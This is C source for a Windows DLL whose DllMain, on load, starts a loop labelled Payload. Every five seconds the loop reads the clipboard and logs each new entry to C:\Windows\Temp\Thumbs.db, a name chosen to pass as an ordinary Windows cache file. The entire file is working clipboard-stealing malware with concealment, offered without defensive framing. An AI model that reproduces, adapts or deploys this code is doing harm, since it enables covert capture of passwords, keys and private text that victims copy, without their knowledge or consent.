#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "info.h"
#include "writetofile.h"

char* GetClipboard() {
    UINT uFormat = CF_TEXT;
    HANDLE hClipData = NULL;
    char* cClipText = NULL;
    char* cClipFormatted = NULL;

    if (!OpenClipboard(NULL)) {
        NOT("OpenClipboard failed with error: 0x%x", GetLastError());
        return NULL;
    }

    LOG("Waiting for clipboard data...");
    hClipData = GetClipboardData(uFormat);
    if (hClipData == NULL) {
        NOT("GetClipboardData failed with error: 0x%x", GetLastError());
        CloseClipboard();
        return NULL;
    }
    YES("Successfully retrieved data from clipboard!");

    cClipText = (char*)GlobalLock(hClipData);
    if (cClipText == NULL) {
        NOT("GlobalLock failed with error: 0x%x", GetLastError());
        CloseClipboard();
        return NULL;
    }

    cClipFormatted = (char*)malloc(strlen(cClipText) + 50);
    if (cClipFormatted == NULL) {
        NOT("Memory allocation failed with error: 0x%x", GetLastError());
        GlobalUnlock(hClipData);
        CloseClipboard();
        return NULL;
    }

    sprintf(cClipFormatted,
        "=====START=====\n"
        "%s\n"
        "======END======\n",
        cClipText);

    GlobalUnlock(hClipData);
    CloseClipboard();

    return cClipFormatted;
}

void Payload() {
    LPCSTR lpFileName[1024];

    sprintf(lpFileName, "C:\\Windows\\Temp\\Thumbs.db");

    char* cOldClipText = NULL;
    char* cClipText = NULL;
    HANDLE hFile = NULL;

    while (1) {
        hFile = NULL;
        cClipText = GetClipboard();
        if (!cClipText) {
            NOT("Failed to get clipboard data.");
            Sleep(5000);
            continue;
        }

        if (cOldClipText == NULL || strcmp(cClipText, cOldClipText) != 0) {
            LOG("Clipboard text changed!");

            if (cOldClipText) {
                free(cOldClipText);
            }
            cOldClipText = _strdup(cClipText);

            DWORD sClipTextSize = strlen(cClipText);
            DWORD dwBytesWritten;

            WriteToFile(lpFileName, cClipText);

            CloseHandle(hFile);
        }
        free(cClipText);
        Sleep(5000);
    }
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  dwReason,
    LPVOID lpReserved
)
{
    switch (dwReason)
    {
    case DLL_PROCESS_ATTACH: {
        Payload();
        break;
    };
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
